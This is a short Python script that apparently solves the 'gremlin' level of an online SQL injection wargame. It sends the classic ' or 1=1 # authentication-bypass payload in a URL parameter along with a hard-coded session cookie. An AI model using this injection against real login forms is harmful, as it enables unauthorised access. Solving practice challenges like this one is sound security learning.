import requests

url = "https://los.rubiya.kr/chall/gremlin_280c5552de8b681110e9287421b834fd.php?"
cookie = {'PHPSESSID':'2l2tjeutp0q371uvicd2a3mtrc'}

def solve():
    query = "pw=%27%20or%201=1%20%23"
    res = requests.get(url=url+query,cookies=cookie)
    if "GREMLIN Clear!" in res.text:
        print("GREMLIN Clear!")

if __name__ == "__main__":
    solve()
